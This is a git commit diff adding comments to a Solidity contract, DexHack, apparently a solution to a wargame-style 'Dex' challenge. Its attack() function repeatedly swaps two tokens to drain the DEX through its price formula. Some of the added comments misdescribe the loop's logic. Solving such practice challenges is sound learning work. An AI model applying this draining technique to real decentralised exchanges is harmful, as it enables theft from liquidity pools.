a87b14db536983289de60e84152749beabd29bce
William Phan <williamphan@MacBook-Pro-40.fios-router.home>
2022-11-27 23:41:55 -0500

    dex

--- src/Dex/DexHack.sol
+++ src/Dex/DexHack.sol
@@ -10,9 +10,10 @@ contract DexHack {
     }
 
     function attack() external {
+        // adds 2 addresses for 2 tokens
         address[2] memory tokens = [dex.token1(), dex.token2()];
         
-        // approve the contract for all tokens
+        // approve the contract for all tokens with openzeppelin
         SwappableToken(tokens[0]).approve(address(dex), type(uint256).max);
         SwappableToken(tokens[1]).approve(address(dex), type(uint256).max);
 
@@ -21,13 +22,15 @@ contract DexHack {
         uint fromIndex = 0;
         uint toIndex = 1;
         while(true){
+            // if token swaps are true, then record balances
             hackBalances = [ SwappableToken(tokens[fromIndex]).balanceOf(address(this)), 
                              SwappableToken(tokens[  toIndex]).balanceOf(address(this))];
 
             dexBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(dex)), 
                            SwappableToken(tokens[  toIndex]).balanceOf(address(dex))];
 
-            uint swapPrice = dex.get_swap_price(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
+            uint swapPrice = dex.get_swap_price(tokens[fromIndex], tokens[toIndex], hackBalances[0]); 
+            // if swap price greater than dex balances, then terminate, otherwise proceed with the swap if both are equal
             if(swapPrice > dexBalances[1]) {
                 dex.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                 break;
